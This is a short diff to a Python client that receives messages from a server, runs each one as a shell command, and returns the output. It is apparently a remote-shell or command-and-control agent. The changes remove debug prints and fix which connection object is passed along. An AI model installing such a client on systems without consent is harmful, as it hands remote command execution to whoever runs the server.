@@ -28,7 +28,6 @@ def execute_command(conn, cmd_str):
     except:
         print("Command failed " + cmd_str)
     stdoutput = (proc.stdout.read() + proc.stderr.read()).decode()
-    print("SENDING: " + stdoutput)
     snd_msg(conn, stdoutput)
 
 def listen_to_server(conn):
@@ -37,7 +36,6 @@ def listen_to_server(conn):
     while connected:
         # Retrieve Message from server
         msg = get_msg(client)
-        print("HERE: " + msg)
 
         if msg == DISCONNECT_MESSAGE:
             connected = False
@@ -74,7 +72,7 @@ def listen_to_server(conn):
             connected = False
 
         else:
-            execute_command(conn, msg)
+            execute_command(client, msg)
     conn.close()
 
 ## ======== Client-Start ========
